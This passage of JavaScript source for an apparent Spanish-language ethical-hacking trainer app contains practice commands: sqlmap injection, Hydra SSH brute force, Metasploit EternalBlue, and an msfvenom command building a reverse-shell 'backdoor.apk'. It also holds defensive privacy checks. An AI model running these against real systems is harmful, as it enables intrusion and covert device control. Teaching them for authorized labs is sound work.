        { label: 'Resultados en JSON', cmd: 'nuclei -u https://ejemplo.com -json -o resultados.json' }
      ],
      learn: [
        'Qué es una vulnerabilidad y cómo se clasifica (CVE, CVSS)',
        'Diferencia entre escaneo automatizado y manual',
        'Qué es WPScan y qué detecta en WordPress',
        'Nuclei: escaneo con templates comunitarios',
        'Interpretar resultados de un escáner'
      ]
    },
    {
      level: 5, title: 'SQL Injection y Ataques Web', subtitle: 'Explotar vulnerabilidades web comunes',
      icon: '💥', time: '1.5 horas',
      install: ['pip install sqlmap', 'pkg install hydra'],
      practice: [
        { label: 'Detectar SQLi con SQLMap', cmd: 'sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1"' },
        { label: 'Listar bases de datos', cmd: 'sqlmap -u "http://testphp.vulnweb.com/artists.php?artist=1" --dbs' },
        { label: 'Fuerza bruta SSH con Hydra', cmd: 'hydra -l root -P passwords.txt ssh://192.168.1.1' },
        { label: 'Buscar exploit con SearchSploit', cmd: 'searchsploit wordpress' },
        { label: 'Buscar por CVE específico', cmd: 'searchsploit cve-2021-41773' }
      ],
      learn: [
        'Qué es SQL Injection y cómo funciona',
        'Tipos de SQLi: in-band, blind, out-of-band',
        'Qué es fuerza bruta y cómo protegerte',
        'Qué son los exploits y cómo encontrarlos',
        'Laboratorios gratis para practicar: tryhackme.com, portswigger.net/web-security'
      ]
    },
    {
      level: 6, title: 'Explotación con Metasploit', subtitle: 'El framework de explotación más poderoso',
      icon: '🧬', time: '1.5 horas',
      install: ['pkg install metasploit'],
      practice: [
        { label: 'Iniciar Metasploit', cmd: 'msfconsole' },
        { label: 'Buscar exploits disponibles', cmd: 'dentro de msfconsole: search eternalblue' },
        { label: 'Usar un exploit', cmd: 'use exploit/windows/smb/ms17_010_eternalblue' },
        { label: 'Ver opciones del módulo', cmd: 'show options' },
        { label: 'Generar payload con MSFVenom', cmd: 'msfvenom -p android/meterpreter/reverse_tcp LHOST=tu_ip LPORT=4444 -o backdoor.apk' }
      ],
      learn: [
        'Qué es Metasploit y cómo funciona',
        'Diferencia entre exploit, payload y auxiliary',
        'Qué es Meterpreter y para qué sirve',
        'Generación de payloads para Android',
        'Siempre en entornos autorizados'
      ]
    },
    {
      level: 7, title: 'Seguridad Móvil — Analiza APKs', subtitle: 'Auditar apps de Android',
      icon: '📱', time: '1 hora',
      install: ['pkg install apktool', 'pkg install jadx'],
      practice: [
        { label: 'Decompilar un APK', cmd: 'apktool d app.apk' },
        { label: 'Ver el AndroidManifest', cmd: 'cat app/AndroidManifest.xml' },
        { label: 'Buscar permisos peligrosos', cmd: 'grep -r "android.permission" app/ | grep -i "camera\\|location\\|sms"' },
        { label: 'Descompilar a Java con JADX', cmd: 'jadx -d output/ app.apk' },
        { label: 'Buscar APIs sensibles', cmd: 'grep -r "getDeviceId\\|getInstalledPackages" output/' }
      ],
      learn: [
        'Estructura de un APK (AndroidManifest, classes.dex, resources)',
        'Permisos peligrosos en Android',
        'Cómo decompilar y analizar código smali/Java',
        'OWASP MASVS: el estándar de seguridad móvil',
        'Qué buscar en una auditoría de APK'
      ]
    },
    {
      level: 8, title: 'Privacidad y Anonimato', subtitle: 'Navegar sin dejar rastro',
      icon: '🧅', time: '30 min',
      install: ['pkg install tor', 'pkg install proxychains-ng'],
      practice: [
        { label: 'Iniciar Tor', cmd: 'tor' },
        { label: 'Verificar IP con Tor', cmd: 'curl --socks5 127.0.0.1:9050 https://check.torproject.org/api/ip' },
        { label: 'Nmap anónimo con proxychains', cmd: 'proxychains nmap -sT scanme.nmap.org' },
        { label: 'Navegar desde terminal', cmd: 'proxychains curl https://duckduckgo.com' }
      ],
      learn: [
        'Cómo funciona la red Tor (onion routing)',
        'Diferencia entre VPN, Tor y proxychains',
        'Qué es el anonimato y qué NO garantiza',
        'Buenas prácticas de privacidad digital',
        'Riesgos de usar estas herramientas ilegalmente'
      ]
    },
    {
      level: 9, title: 'Password Cracking (Ético)', subtitle: 'Entender la seguridad de contraseñas',
      icon: '🔓', time: '1 hora',
      install: ['pkg install john', 'pkg install hashcat', 'pkg install hydra'],
      practice: [
        { label: 'Identificar tipo de hash', cmd: 'echo "5d41402abc4b2a76b9719d911017c592" | hashid' },
        { label: 'Crackear MD5 con John', cmd: 'echo "admin:5d41402abc4b2a76b9719d911017c592" > hash.txt && john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt' },
        { label: 'Crackear con reglas', cmd: 'john --wordlist=wordlist.txt --rules hash.txt' },
        { label: 'Ver resultados', cmd: 'john --show hash.txt' }
      ],
      learn: [
        'Tipos de hash: MD5, SHA1, SHA256, bcrypt',
        'Qué es un ataque de diccionario vs fuerza bruta',
        'Cómo funcionan las rainbow tables',
        'Importancia de contraseñas fuertes',
        'Solo con tus propios hashes o con autorización'
      ]
    },
    {
      level: 10, title: 'Bug Bounty — El Siguiente Nivel', subtitle: 'Gana dinero encontrando bugs',
      icon: '🏆', time: 'Lectura',
      install: ['Lee los recursos recomendados'],
      practice: [
        { label: 'Plataforma #1', cmd: 'Crear cuenta en hackerone.com' },
        { label: 'Plataforma #2', cmd: 'Crear cuenta en bugcrowd.com' },
        { label: 'Laboratorios gratis', cmd: 'PortSwigger Web Security Academy' },
        { label: 'CTF para practicar', cmd: 'tryhackme.com y hackthebox.com' }
      ],
      learn: [
        'Qué es Bug Bounty y cómo funciona',
        'Plataformas: HackerOne, Bugcrowd, Intigriti',
        'Cómo escribir un buen reporte de vulnerabilidad',
        'Programas públicos vs privados',
        'Habilidades necesarias para empezar'
      ]
    }
  ],

  glossary: [
    { term: 'CVE', def: 'Common Vulnerabilities and Exposures. Identificador único para vulnerabilidades de seguridad conocidas públicamente.' },
    { term: 'CVSS', def: 'Common Vulnerability Scoring System. Sistema de puntuación (0-10) que mide la severidad de una vulnerabilidad.' },
    { term: '0-Day', def: 'Vulnerabilidad desconocida para el público o el fabricante. No existe parche disponible.' },
    { term: 'XSS', def: 'Cross-Site Scripting. Vulnerabilidad que permite inyectar scripts maliciosos en páginas web visitadas por otros usuarios.' },
    { term: 'SQLi', def: 'SQL Injection. Inyección de comandos SQL a través de inputs del usuario para manipular bases de datos.' },
    { term: 'RCE', def: 'Remote Code Execution. Vulnerabilidad que permite ejecutar código arbitrario en un sistema remoto.' },
    { term: 'LFI/RFI', def: 'Local/Remote File Inclusion. Permite incluir archivos locales o remotos en una aplicación, frecuentemente llevando a RCE.' },
    { term: 'OSINT', def: 'Open Source Intelligence. Recolección de información de fuentes públicas como redes sociales, motores de búsqueda y registros DNS.' },
    { term: 'Pentest', def: 'Penetration Test. Prueba de seguridad autorizada que simula un ataque real para identificar vulnerabilidades.' },
    { term: 'POC', def: 'Proof of Concept. Demostración práctica que prueba la existencia de una vulnerabilidad.' },
    { term: 'Payload', def: 'Código malicioso diseñado para ejecutarse en el sistema objetivo tras una explotación exitosa.' },
    { term: 'Reverse Shell', def: 'Conexión saliente desde el objetivo hacia el atacante, otorgando control sobre la terminal del sistema comprometido.' },
    { term: 'Phishing', def: 'Técnica de ingeniería social que busca engañar a usuarios para que revelen información sensible (credenciales, datos bancarios).' },
    { term: 'DDoS', def: 'Distributed Denial of Service. Ataque que satura un servidor con tráfico masivo desde múltiples fuentes para dejarlo inaccesible.' },
    { term: 'MITM', def: 'Man-in-the-Middle. Ataque donde el atacante intercepta la comunicación entre dos partes sin que estas lo sepan.' },
    { term: 'OWASP', def: 'Open Web Application Security Project. Fundación sin fines de lucro dedicada a mejorar la seguridad del software.' },
    { term: 'API Key', def: 'Clave de autenticación para acceder a APIs. Su exposición puede llevar a uso no autorizado de servicios.' },
    { term: 'CORS', def: 'Cross-Origin Resource Sharing. Mecanismo de seguridad del navegador que controla qué dominios pueden acceder a recursos.' },
    { term: 'IDOR', def: 'Insecure Direct Object Reference. Vulnerabilidad donde un usuario puede acceder a objetos (archivos, datos) que no le pertenecen.' },
    { term: 'SSRF', def: 'Server-Side Request Forgery. Vulnerabilidad que permite a un atacante hacer que el servidor realice peticiones a lugares no previstos.' },
    { term: 'Honeypot', def: 'Señuelo o sistema trampa diseñado para atraer y detectar atacantes, estudiando sus técnicas y comportamientos.' },
    { term: 'Sandbox', def: 'Entorno aislado y seguro donde se ejecuta código no confiable para analizarlo sin riesgo al sistema principal.' },
    { term: 'Termux', def: 'Terminal emulator y entorno Linux para Android. Permite ejecutar herramientas de ciberseguridad directamente en el móvil.' },
    { term: 'F-Droid', def: 'Repositorio de apps open source para Android. Fuente recomendada para instalar Termux de forma segura.' },
    { term: 'WSL', def: 'Windows Subsystem for Linux. Capa de compatibilidad para ejecutar Linux directamente en Windows sin VM.' }
  ],

  defense: {
    checklist: [
      { id: 'vpn', text: 'Uso VPN en redes WiFi públicas', icon: '🔒' },
      { id: '2fa', text: 'Tengo 2FA activado en todas mis cuentas', icon: '🔑' },
      { id: 'pwd', text: 'Uso contraseñas únicas con gestor (Bitwarden, Keepass)', icon: '🔐' },
      { id: 'fw', text: 'Firewall activado en mi dispositivo', icon: '🛡️' },
      { id: 'update', text: 'SO y apps siempre actualizados', icon: '📲' },
      { id: 'cam', text: 'Cámara y micrófono tapados cuando no los uso', icon: '📷' },
      { id: 'browser', text: 'Navegador con anti-fingerprinting y bloqueador de anuncios', icon: '🌐' },
      { id: 'perm', text: 'Reviso permisos de apps periódicamente', icon: '🔍' },
      { id: 'wifi', text: 'WiFi y Bluetooth apagados cuando no los necesito', icon: '📡' },
      { id: 'dns', text: 'Uso DNS seguro (Cloudflare 1.1.1.1 o similar)', icon: '🌍' },
      { id: 'track', text: 'Tengo bloqueo de rastreadores en mi navegador', icon: '👁️' },
      { id: 'vault', text: 'No guardo contraseñas en el navegador', icon: '🗄️' }
    ],
    checks: [
      {
        id: 'ip', title: '🔎 ¿Mi IP está expuesta?', icon: '🌐',
        desc: 'Verifica si tu IP real se filtra al navegar. Compara tu IP normal vs con Tor.',
        commands: [
          { label: 'Ver mi IP pública', cmd: 'curl -s ifconfig.me' },
          { label: 'Ver IP a través de Tor', cmd: 'curl --socks5 127.0.0.1:9050 -s ifconfig.me' },
          { label: 'Ver si hay DNS leak', cmd: 'curl -s https://dnsleaktest.com -o /dev/null && echo "Revisa en dnsleaktest.com"' }
        ],
        indicator: 'Si ambas IPs son diferentes, Tor funciona. Si son iguales, no estás anónimo.'
      },
      {
        id: 'tracking', title: '👁️ ¿Me están rastreando?', icon: '👁️',
        desc: 'Detecta conexiones sospechosas, procesos ocultos y actividad inusual en tu dispositivo.',
        commands: [
          { label: 'Conexiones activas en tu red', cmd: 'netstat -an | grep ESTABLISHED' },
          { label: 'Procesos en segundo plano', cmd: 'ps aux | grep -E "camera|mic|audio|recorder"' },
          { label: 'Puertos abiertos en tu dispositivo', cmd: 'nmap -sT 127.0.0.1' },
          { label: 'Tráfico por puerto específico', cmd: 'tcpdump -i any port 80 -c 10' }
        ],
        indicator: 'Busca conexiones a IPs desconocidas o procesos de cámara/audio activos sin razón.'
      },
      {
        id: 'breach', title: '📢 ¿Mis datos están filtrados?', icon: '📢',
        desc: 'Verifica si tu correo o contraseñas han sido expuestos en filtraciones conocidas.',
        commands: [
          { label: 'Checkear email en HaveIBeenPwned', cmd: 'curl -s "https://haveibeenpwned.com/api/v3/breachedaccount/tu@email.com" | grep -o "Name[^,]*"' },
          { label: 'Verificar contraseña filtrada (k-anonimato)', cmd: 'echo -n "tucontraseña" | sha1sum | cut -c1-5 | xargs -I{} curl -s "https://api.pwnedpasswords.com/range/{}"' }
        ],
        indicator: 'Si aparecen resultados, tus datos están en filtraciones públicas. Cambia contraseñas YA.'
      },
      {
        id: 'fingerprint', title: '🖐️ ¿Me pueden identificar por el navegador?', icon: '🖐️',
        desc: 'El fingerprinting te identifica aunque uses VPN/incógnito. Verifica qué tan único eres.',
        commands: [
          { label: 'Ver mi fingerprint del navegador', cmd: 'Abre https://coveryourtracks.eff.org en tu navegador' },
          { label: 'Prueba de WebRTC leak', cmd: 'Abre https://browserleaks.com/webrtc en tu navegador' }
        ],
        indicator: 'Si tu fingerprint es único, puedes ser rastreado aunque uses VPN.'
      },
      {
        id: 'malware', title: '🦠 ¿Tengo malware o stalkerware?', icon: '🦠',
        desc: 'Detecta software espía, keyloggers o accesos no autorizados en tu dispositivo Android.',
        commands: [
          { label: 'Apps con permisos peligrosos', cmd: 'pkg install termux-api && termux-app-list | grep -i "camera\\|location\\|sms\\|record_audio"' },
          { label: 'Procesos ocultos de sistema', cmd: 'ps -ef | grep -v "^ " | grep -v "\[" | head -30' },
          { label: 'Ver qué apps usan la red', cmd: 'netstat -tupn 2>/dev/null || netstat -tun' },
          { label: 'Buscar archivos sospechosos', cmd: 'find /sdcard -name "*.apk" -mtime -7 2>/dev/null' }
        ],
        indicator: 'Apps con permisos de cámara/micrófono sin justificación son sospechosas.'
      },
      {
        id: 'wifi', title: '📶 ¿Mi WiFi es seguro?', icon: '📶',
        desc: 'Analiza la seguridad de tu red WiFi y detecta intrusos.',
        commands: [
          { label: 'Ver dispositivos en tu red', cmd: 'nmap -sn 192.168.1.0/24' },
          { label: 'Ver qué puertos tienes abiertos', cmd: 'nmap -sT 192.168.1.1' },
          { label: 'Comprobar seguridad del router', cmd: 'curl -s http://192.168.1.1 | grep -i "model\\|version"' }
        ],
        indicator: 'Si ves dispositivos desconocidos en tu red, alguien más está conectado.'
      }
    ],
    hardening: [
      {
        title: '📱 Hardening Android', icon: '📱',
        steps: [
          'Desactiva "Instalar apps de fuentes desconocidas" cuando no lo uses',
          'Revisa permisos de apps en Ajustes > Apps > Permisos',
          'Activa "Google Play Protect"',
          'Usa gestor de contraseñas (Bitwarden, Keepass)',
          'Activa cifrado de dispositivo (Ajustes > Seguridad > Cifrado)',
          'No uses redes WiFi públicas sin VPN',
          'Apaga WiFi/Bluetooth cuando no los necesites',
          'Revisa apps con acceso a cámara, micrófono y ubicación'
        ]
      },
      {
        title: '🌐 Hardening Navegador', icon: '🌐',
        steps: [
          'Usa Firefox + uBlock Origin + Privacy Badger',
          'O usa Tor Browser para máxima privacidad',
          'Activa "Do Not Track" en ajustes de privacidad',
          'Desactiva WebRTC en about:config (media.peerconnection.enabled = false)',
          'Usa DNS over HTTPS (Cloudflare 1.1.1.1 o NextDNS)',
          'Limpia cookies y caché regularmente',
          'No guardes contraseñas en el navegador',
          'Revisa extensiones y elimina las que no uses'
        ]
      },
      {
        title: '🧅 Hardening Anonimato', icon: '🧅',
        steps: [
          'Instala Tor Browser para navegación anónima',
          'Configura proxychains para enrutar tools por Tor',
          'Nunca hagas DOX (doxxing) — es contraproducente y peligroso',
          'Usa emails desechables para registros temporales',
          'No uses tu nombre real en foros de seguridad',
          'Separa identidades: una real, una para investigación',
          'Verifica en dnsleaktest.com que tu DNS no filtre',
          'Testea en browserleaks.com que WebRTC no exponga tu IP'
        ]
      },
      {
        title: '🔐 Hardening de Cuentas', icon: '🔐',
        steps: [
          'Activa 2FA en TODAS tus cuentas (usa Authy o Aegis)',
          'No uses SMS como 2FA si puedes evitarlo (usa TOTP)',
          'Contraseñas únicas para cada servicio',
          'Revísate en haveibeenpwned.com con tu correo',
          'Cierra sesiones activas en dispositivos que no reconozcas',
          'No uses "Iniciar sesión con Google/Facebook" en sitios importantes',
          'Descarga tus datos de servicios que ya no uses y da de baja la cuenta'
        ]
      }
    ]
  },

  resources: [
    {
      icon: '📱', title: 'Termux (F-Droid)', desc: 'Terminal Linux para Android. Esencial para ejecutar tools de seguridad en tu móvil. Instálalo desde F-Droid, NO desde Play Store.',
      url: 'https://f-droid.org/packages/com.termux/'
    },
    {
      icon: '🎓', title: 'TryHackMe', desc: 'Plataforma interactiva para aprender ciberseguridad con laboratorios guiados. Ideal para principiantes.',
      url: 'https://tryhackme.com'
    },
    {
      icon: '⚔️', title: 'HackTheBox', desc: 'Laboratorios de CTF y máquinas vulnerables para practicar hacking ético de nivel intermedio a avanzado.',
      url: 'https://hackthebox.com'
    },
    {
      icon: '📖', title: 'PortSwigger Web Security Academy', desc: 'Cursos gratuitos de seguridad web con laboratorios interactivos. De los mejores recursos gratuitos.',
      url: 'https://portswigger.net/web-security'
    },
    {
      icon: '🛡️', title: 'OWASP', desc: 'Estándares, guías y herramientas para seguridad de aplicaciones. El MASVS y ASVS son referencia obligada.',
      url: 'https://owasp.org'
    },
    {
      icon: '📱', title: 'OWASP Mobile Security Testing Guide', desc: 'Guía completa de pruebas de seguridad para apps móviles Android e iOS.',
      url: 'https://github.com/OWASP/owasp-mstg'
    },
    {
      icon: '💻', title: 'Termux-Dev Setup', desc: 'Guía para configurar Termux con herramientas de hacking ético.',
      url: 'https://github.com/termux/termux-packages'
    },
    {
      icon: '🏆', title: 'Bugcrowd / HackerOne', desc: 'Plataformas de Bug Bounty donde puedes encontrar vulnerabilidades reales y ganar recompensas.',
      url: 'https://bugcrowd.com'
    },
    {
      icon: '📜', title: 'Exploit-DB', desc: 'Base de datos de exploits y vulnerabilidades públicas. Mantenida por Offensive Security.',
      url: 'https://www.exploit-db.com'
    },
    {
      icon: '📘', title: 'The Cyber Plumber\'s Handbook', desc: 'Guía práctica de tunneling, port forwarding y pivoting en pruebas de penetración.',
      url: 'https://github.com/opsdisk/the_cyber_plumbers_handbook'
    },
    {
      icon: '🎥', title: 'IppSec (YouTube)', desc: 'Walkthroughs detallados de máquinas HackTheBox. Aprende técnicas reales de pentesting.',
      url: 'https://youtube.com/c/ippsec'
    },
    {
      icon: '📡', title: 'Shodan', desc: 'Buscador de dispositivos conectados a Internet. Encuentra servidores, cámaras, routers, PLCs.',
      url: 'https://www.shodan.io'
    },
    {
      icon: '📄', title: 'CVE Mitre', desc: 'Base de datos oficial de vulnerabilidades conocidas (CVEs). Fuente de consulta obligatoria.',
      url: 'https://cve.mitre.org'
    },
    {
      icon: '📚', title: 'Roadmap.sh - Cyber Security', desc: 'Roadmap visual de las habilidades necesarias para convertirte en profesional de ciberseguridad.',
      url: 'https://roadmap.sh/cyber-security'
    }
  ]
};

// ========== APP LOGIC ==========
const App = {
  currentSection: 'dashboard',
  currentFilter: 'all',
  searchQuery: '',

  init() {
    this.isEmbed = document.documentElement.classList.contains('embed-mode');
    this.nativeBridge = this.hasTermuxBridge();
    this.notebookData = this.loadNotebook();
    this.renderDashboard();
    this.renderTools();
    this.renderLearning();
    this.renderGlossary();
    this.renderResources();
    this.renderDefense();
    this.renderNotebook();
    this.setupNavigation();
    this.setupSearch();
    this.setupFilters();
    this.setupModal();
    this.setupTerminal();
    this.hideSplash();
    if (this.nativeBridge) {
      document.body.classList.add('has-native-terminal');
      const status = document.getElementById('bridge-status');
      if (status) status.textContent = '● Terminal integrado';
    }
    if (this.isEmbed) {
      this.switchSection('tools');
    }
  },

  hideSplash() {
    const delay = this.isEmbed ? 0 : 1500;
    setTimeout(() => {
      document.getElementById('splash').classList.add('hidden');
      if (!this.isEmbed && !localStorage.getItem('ninjapp_wizard_done')) {
        setTimeout(() => this.showWizard(), 300);
      }
    }, delay);
  },

  showWizard() {
    document.getElementById('setup-wizard').classList.add('open');
    document.querySelector('.wizard-step[data-step="1"]').classList.add('active');
  },

  nextWizardStep() {
    const current = document.querySelector('.wizard-step.active');
    const next = current.nextElementSibling;
    if (next && next.classList.contains('wizard-step')) {
      current.classList.remove('active');
      next.classList.add('active');
    }
  },

  closeWizard() {
    document.getElementById('setup-wizard').classList.remove('open');
    document.querySelectorAll('.wizard-step').forEach(s => s.classList.remove('active'));
    localStorage.setItem('ninjapp_wizard_done', 'true');
  },

  copyWizardCmd() {
    const cmd = 'pkg update && pkg upgrade -y';
    const el = document.querySelector('.wizard-command');
    if (navigator.clipboard) {
      navigator.clipboard.writeText(cmd).then(() => {
        if (el) { el.innerHTML = '✓ Copiado!'; setTimeout(() => { el.innerHTML = cmd; }, 1500); }
      });
    }
  },

  setupNavigation() {
    document.querySelectorAll('.nav-item').forEach(item => {
      item.addEventListener('click', () => {
        this.switchSection(item.dataset.section);
      });
    });
  },

  switchSection(section) {
    this.currentSection = section;
    document.querySelectorAll('.nav-item').forEach(n => n.classList.remove('active'));
    document.querySelector(`.nav-item[data-section="${section}"]`).classList.add('active');
    document.querySelectorAll('.section').forEach(s => s.classList.remove('active'));
    document.getElementById(`section-${section}`).classList.add('active');
    document.getElementById('content').scrollTop = 0;
  },

  setupSearch() {
    document.getElementById('search-bar').addEventListener('input', e => {
      this.searchQuery = e.target.value.toLowerCase();
      this.renderTools();
    });
  },

  setupFilters() {
    document.querySelectorAll('.filter-chip').forEach(chip => {
      chip.addEventListener('click', () => {
        document.querySelectorAll('.filter-chip').forEach(c => c.classList.remove('active'));
        chip.classList.add('active');
        this.currentFilter = chip.dataset.filter;
        this.renderTools();
      });
    });
  },

  setupModal() {
    const modal = document.getElementById('tool-modal');
    modal.addEventListener('click', e => {
      if (e.target === modal) modal.classList.remove('open');
    });
    document.getElementById('modal-close').addEventListener('click', () => {
      modal.classList.remove('open');
    });
  },

  openToolModal(toolId) {
    const tool = DATA.tools.find(t => t.id === toolId);
    if (!tool) return;

    const modal = document.getElementById('tool-modal');
    const content = modal.querySelector('.modal-content');

    content.innerHTML = `
      <div style="display:flex;align-items:flex-start;margin-bottom:16px;">
        <div style="flex:1;">
          <div class="modal-tool-name">${tool.icon} ${tool.name}</div>
          <span class="modal-tool-category">${tool.catLabel} · ${tool.platform || 'Multi-plataforma'}</span>
        </div>
        <button class="modal-close" id="modal-close-inner">✕</button>
      </div>

      <div class="modal-section-title">📖 Descripción</div>
      <div class="modal-tool-desc">${tool.desc}</div>

      ${tool.ethicalDesc ? `
      <div class="modal-section-title" style="color:var(--accent-yellow);">⚠️ Uso Ético</div>
      <div class="modal-tool-desc" style="color:var(--accent-yellow);margin-bottom:12px;">${tool.ethicalDesc}</div>
      ` : ''}

      <div class="modal-section-title">💻 Comandos</div>
      ${tool.commands.map(c => `
        <div style="margin-bottom:10px;">
          <div style="font-size:11px;color:var(--text-secondary);margin-bottom:3px;">${c.label}</div>
          <div class="modal-command" style="cursor:pointer;" onclick="if(navigator.clipboard){navigator.clipboard.writeText('${c.cmd.replace(/'/g,"\\'")}').then(()=>{this.innerHTML='✓ Copiado!';setTimeout(()=>this.innerHTML='${c.cmd.replace(/'/g,"\\'")}',1200)});}">${c.cmd}</div>
        </div>
      `).join('')}
      <div style="text-align:center;margin-bottom:12px;">
        <button onclick="App.openTerminal('${tool.commands[0].cmd.replace(/'/g,"\\'")}')" style="padding:8px 20px;background:rgba(0,255,65,0.1);border:1px solid rgba(0,255,65,0.3);border-radius:4px;color:var(--accent-green);font-family:var(--font-mono);font-size:11px;cursor:pointer;">▶ Probar en Terminal</button>
      </div>

      <div class="modal-section-title">📥 Instalación</div>
      <div class="modal-command">${tool.install}</div>

      <div style="display:flex;gap:8px;flex-wrap:wrap;margin-top:12px;">
        ${tool.downloadUrl ? `
        <a href="${tool.downloadUrl}" target="_blank" rel="noopener noreferrer" style="flex:1;min-width:120px;text-align:center;padding:10px 16px;background:rgba(0,255,65,0.1);border:1px solid rgba(0,255,65,0.3);border-radius:var(--radius-sm);color:var(--accent-green);text-decoration:none;font-family:var(--font-mono);font-size:11px;">
          ⬇ ${tool.downloadLabel || 'Descargar'}
        </a>
        ` : ''}
        ${tool.url ? `
        <a href="${tool.url}" target="_blank" rel="noopener noreferrer" style="flex:1;min-width:120px;text-align:center;padding:10px 16px;background:rgba(0,212,255,0.1);border:1px solid rgba(0,212,255,0.3);border-radius:var(--radius-sm);color:var(--accent-cyan);text-decoration:none;font-family:var(--font-mono);font-size:11px;">
          🌐 Sitio oficial
        </a>
        ` : ''}
      </div>

      ${tool.termux ? `
      <div style="margin-top:12px;padding:10px;background:rgba(0,0,0,0.3);border:1px solid var(--border-color);border-radius:var(--radius-sm);">
        <div style="font-size:10px;color:var(--accent-yellow);font-family:var(--font-mono);margin-bottom:4px;">📱 También disponible en Termux (Android)</div>
        <div style="font-size:10px;color:var(--text-muted);font-family:var(--font-mono);">Abre Termux y ejecuta: <span style="color:var(--accent-green);">${tool.install}</span></div>
      </div>
      ` : ''}
    `;

    content.querySelector('#modal-close-inner').addEventListener('click', () => {
      modal.classList.remove('open');
    });

    // Click-to-copy for command blocks
    content.querySelectorAll('.modal-command').forEach(block => {
      block.addEventListener('click', () => {
        const text = block.textContent.trim();
        if (navigator.clipboard) {
          navigator.clipboard.writeText(text).then(() => {
            block.style.borderColor = 'var(--accent-green)';
            const orig = block.innerHTML;
            block.innerHTML = '✓ ¡Copiado!';
            setTimeout(() => { block.innerHTML = orig; block.style.borderColor = ''; }, 1200);
          });
        }
      });
      block.style.cursor = 'pointer';
      block.title = 'Toca para copiar';
    });
    // Also make install command copyable
    const installBlocks = content.querySelectorAll('.modal-command');
    // Already handled above

    modal.classList.add('open');
  },

  // ===== TERMINAL ENGINE =====

  terminalDb: {
    'nmap': {
      learn: 'Nmap escanea puertos TCP/UDP. El flag -sV detecta versiones de servicios. Los puertos comunes: 22 (SSH), 80 (HTTP), 443 (HTTPS), 21 (FTP). Un puerto "open" significa que el servicio está aceptando conexiones.'
    },
    'gobuster': {
      learn: 'Gobuster realiza fuerza bruta de directorios web. Usa un diccionario de palabras comunes y prueba cada una contra el servidor. Status 200 = existe, 301 = redirige, 403 = prohibido, 404 = no existe.'
    },
    'nikto': {
      learn: 'Nikto es un escáner de servidores web. Revisa más de 6700 archivos/CGI potencialmente peligrosos, versiones desactualizadas y configuraciones incorrectas.'
    },
    'wpscan': {
      learn: 'WPScan escanea sitios WordPress. Detecta la versión de WP, plugins instalados, temas y usuarios. La flag --enumerate u descubre nombres de usuario registrados.'
    },
    'sqlmap': {
      learn: 'SQLMap automatiza la detección y explotación de SQL Injection. --dbs lista las bases de datos, --tables lista las tablas, --dump extrae los datos. Siempre con autorización.'
    },
    'hydra': {
      learn: 'Hydra realiza fuerza bruta contra servicios de red. Prueba combinaciones de usuario/contraseña hasta encontrar la correcta. Solo en sistemas propios.'
    },
    'metasploit': {
      learn: 'Metasploit es un framework de explotación. "search" busca módulos, "use" los carga, "show options" muestra parámetros, "run" ejecuta el exploit.'
    },
    'nuclei': {
      learn: 'Nuclei usa templates YAML para escanear vulnerabilidades. Cada template es una prueba específica. Los tags permiten filtrar por tecnología o tipo.'
    },
    'jadx': {
      learn: 'JADX descompila archivos DEX (Android) a código Java legible. Útil para auditar apps: busca APIs sensibles, strings hardcodeadas, ofuscación.'
    },
    'apktool': {
      learn: 'APKTool descompila recursos de un APK a su formato original Smali. Permite modificar y recompilar. Esencial para análisis de malware y modding.'
    },
    'curl': {
      learn: 'curl transfiere datos desde/hacia servidores. -s = silencioso, -I = solo cabeceras, -o /dev/null descarta el body, -v modo verbose.'
    },
    'ping': {
      learn: 'ping prueba conectividad con un host. Mide el tiempo de ida y vuelta (RTT). Un TTL alto indica que el host está lejos (muchos saltos).'
    },
    'traceroute': {
      learn: 'traceroute muestra cada salto que hace un paquete hasta su destino. Útil para diagnosticar dónde se pierde la conexión.'
    },
    'netstat': {
      learn: 'netstat muestra conexiones de red activas. ESTABLISHED = conexión activa, LISTEN = servicio esperando, TIME_WAIT = cerrando.'
    },
    'tcpdump': {
      learn: 'tcpdump captura paquetes de red en tiempo real. Muestra IPs origen/destino, puertos y protocolos. -c limita el número de paquetes.'
    },
    'sherlock': {
      learn: 'Sherlock busca un nombre de usuario en cientos de redes sociales. Si encuentra resultado, esa cuenta existe con ese username.'
    },
    'theharvester': {
      learn: 'theHarvester recolecta información pública (correos, subdominios, IPs) de motores de búsqueda. -d es el dominio a investigar, -b la fuente.'
    },
    'proxychains': {
      learn: 'Proxychains enruta el tráfico de cualquier programa a través de proxies configurados. Muy usado con Tor para anonimizar herramientas como nmap.'
    },
    'tor': {
      learn: 'Tor enruta tu tráfico a través de 3 nodos cifrados. Tu IP pública cambia. Verifica en check.torproject.org si está funcionando.'
    },
    'john': {
      learn: 'John the Ripper crackea hashes de contraseñas. --wordlist usa un diccionario, --rules aplica mutaciones, --show muestra las descifradas.'
    }
  },

  openTerminal(cmd) {
    const modal = document.getElementById('terminal-modal');
    const output = document.getElementById('terminal-output');
    const input = document.getElementById('terminal-input');

    modal.classList.add('open');
    if (cmd) {
      input.value = cmd;
      this.executeCommand(cmd);
    }
    input.focus();
  },

  executeCommand(cmd) {
    const output = document.getElementById('terminal-output');
    const input = document.getElementById('terminal-input');
    const trimmed = cmd.trim();

    if (!trimmed) return;

    this.addNotebookEntry('command', trimmed);

    // Add prompt line
    const promptLine = document.createElement('div');
    promptLine.className = 'terminal-line prompt-line';
    promptLine.textContent = `└──╼ ${trimmed}`;
    output.appendChild(promptLine);

    // Clear input
    input.value = '';

    // Parse command
    const parts = trimmed.split(/\s+/);
    const base = parts[0].toLowerCase();

    // Check if it's a known tool or common command
    const known = this.terminalDb[base];

    if (known) {
      // Show sample output
      this.showSampleOutput(output, base, trimmed, known);
    } else if (base === 'clear' || base === 'cls') {
      output.innerHTML = '';
    } else if (base === 'help') {
      this.showHelp(output);
    } else if (base === 'echo') {
      const line = document.createElement('div');
      line.className = 'terminal-line output';
      line.textContent = parts.slice(1).join(' ') || '';
      output.appendChild(line);
    } else if (base === 'whoami') {
      const line = document.createElement('div');
      line.className = 'terminal-line output';
      line.textContent = 'u0_a321';
      output.appendChild(line);
    } else if (base === 'pkg') {
      const line = document.createElement('div');
      line.className = 'terminal-line output';
      line.textContent = '⏳ Procesando... Este comando se ejecuta en Termux. Copia el comando y pégalo en Termux.';
      output.appendChild(line);
      this.addCopyGuide(output, trimmed);
    } else {
      // Unknown command - suggest copying to Termux
      const line = document.createElement('div');
      line.className = 'terminal-line info';
      line.textContent = `ℹ️ "${trimmed}" no está en la base de aprendizaje, pero puedes ejecutarlo en Termux:`;
      output.appendChild(line);
      this.addCopyGuide(output, trimmed);
    }

